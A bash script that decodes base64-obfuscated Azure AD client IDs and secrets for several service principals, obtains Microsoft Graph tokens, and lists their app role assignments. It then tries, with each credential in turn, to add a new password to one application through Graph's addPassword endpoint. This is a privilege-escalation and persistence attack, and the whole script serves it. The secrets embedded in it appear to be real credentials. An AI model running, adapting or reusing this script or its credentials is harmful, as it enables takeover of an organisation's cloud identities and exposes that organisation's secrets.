#!/bin/bash
set -e

DA_CID=$(echo "MmMzNDMwMGUtMWJjMC00MWU3LTljMWUtOGI3NTcxZDcyYzcy" | base64 -d)
DA_SEC=$(echo "QWw3OFF+bjViZG9PM3JrQ2p1bzJKSTJOSHFhZ0pvb2Fac2ZYTmNtNg==" | base64 -d)

GT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=$DA_CID" \
  -d "client_secret=$DA_SEC" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "grant_type=client_credentials" | jq -r .access_token)

# Check appRoleAssignments for ALL tbl- SPs
echo "=== APP ROLE ASSIGNMENTS ==="
for SP_OID in \
  "63e87ab1-6bd2-4e80-92be-943450b20e4f" \
  "1fe7a412-82e9-4135-ab4b-72a0be429adb" \
  "70a07660-06bb-4396-b754-59fbad0b143e" \
  "43834909-47cf-4a4a-8048-e323b4897ed3" \
  "1b513b26-a18d-4d20-ac5f-e19bab1be785" \
  "92a74471-fd09-41a6-be80-53e952a85f6d" \
  "f64d08c7-fde6-4553-99c8-5bf73666ee8c"; do

  ARA=$(curl -sS "https://graph.microsoft.com/v1.0/servicePrincipals/$SP_OID/appRoleAssignments" \
    -H "Authorization: Bearer $GT")
  echo "SP_$SP_OID=$(echo "$ARA" | jq -c '[.value[] | {appRoleId, resourceDisplayName}]')"
done

# Also check the 6 KV1 SPs by their SP objectIds
# First resolve SP objectIds for remaining SPs
for APP_ID in \
  "12ed54de-f2eb-4784-804c-3a7a3e83a9e9" \
  "881fddce-6208-4af5-a297-7e79c912f83c" \
  "58108da8-044e-4d7e-9a46-92e6179b30be" \
  "2c34300e-1bc0-41e7-9c1e-8b7571d72c72"; do

  SP_INFO=$(curl -sS "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=appId%20eq%20'$APP_ID'&\$select=id,displayName" \
    -H "Authorization: Bearer $GT")
  SP_OID=$(echo "$SP_INFO" | jq -r '.value[0].id')
  SP_NAME=$(echo "$SP_INFO" | jq -r '.value[0].displayName')
  
  ARA=$(curl -sS "https://graph.microsoft.com/v1.0/servicePrincipals/$SP_OID/appRoleAssignments" \
    -H "Authorization: Bearer $GT")
  echo "SP_${SP_NAME}(${SP_OID})=$(echo "$ARA" | jq -c '[.value[] | {appRoleId, resourceDisplayName}]')"
done

# Also try addPassword with secrets-sync-principal
echo "=== SECRETS SYNC ADD PASSWORD ==="
SS_CID=$(echo "NTgxMDhkYTgtMDQ0ZS00ZDdlLTlhNDYtOTJlNjE3OWIzMGJl" | base64 -d)
SS_SEC=$(echo "fjhUOFF+WXdFbWV4U1RSdl9wVXNFd2E5UU1hcHlQMzl+Q1U1VWN1Mg==" | base64 -d)

SS_GT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=$SS_CID" \
  -d "client_secret=$SS_SEC" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "grant_type=client_credentials" | jq -r .access_token)
echo "SS_GT_LEN=${#SS_GT}"

R=$(curl -sS -w "\nHTTP:%{http_code}" -X POST "https://graph.microsoft.com/v1.0/applications/22a3fb7e-860a-4708-9e50-3d36aa21191c/addPassword" \
  -H "Authorization: Bearer $SS_GT" \
  -H "Content-Type: application/json" \
  -d '{"passwordCredential":{"displayName":"ss-probe"}}')
echo "SS_ADDPW=$(echo "$R" | base64 -w0)"

# Try with ALL other SPs
for SP_DATA in \
  "MDM4YmMzNWQtMTMxZC00OTUzLTk5ODUtZmY0YTI0NWNjZWMx:MUJFOFF+eUdROGVfejZWQmN6bEdKOFllT0hnTlJVZmZiZ051ZmIybQ==:cost" \
  "ODgxZmRkY2UtNjIwOC00YWY1LWEyOTctN2U3OWM5MTJmODNj:LVRsOFF+c0gwUU9QLlZyS1doYTMtN3g0WEEySnhTNGowOG51dmJRTg==:viewer" \
  "MTJlZDU0ZGUtZjJlYi00Nzg0LTgwNGMtM2E3YTNlODNhOWU5:blA4OFF+OEl+d2lwMEdPbFcxNXpkdDNGTU12QlY5TFl0YU9vZWEzeg==:repsvc" \
  "NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0:c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==:sync"; do

  IFS=: read CID_B64 SEC_B64 LABEL <<< "$SP_DATA"
  SP_CID=$(echo "$CID_B64" | base64 -d)
  SP_SEC=$(echo "$SEC_B64" | base64 -d)
  
  SP_GT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
    -d "client_id=$SP_CID" \
    -d "client_secret=$SP_SEC" \
    -d "scope=https://graph.microsoft.com/.default" \
    -d "grant_type=client_credentials" | jq -r .access_token)
  
  R2=$(curl -sS -o /dev/null -w "%{http_code}" -X POST "https://graph.microsoft.com/v1.0/applications/22a3fb7e-860a-4708-9e50-3d36aa21191c/addPassword" \
    -H "Authorization: Bearer $SP_GT" \
    -H "Content-Type: application/json" \
    -d "{\"passwordCredential\":{\"displayName\":\"$LABEL-p\"}}")
  echo "${LABEL}_ADDPW_HTTP=$R2"
done

echo "=== DONE ==="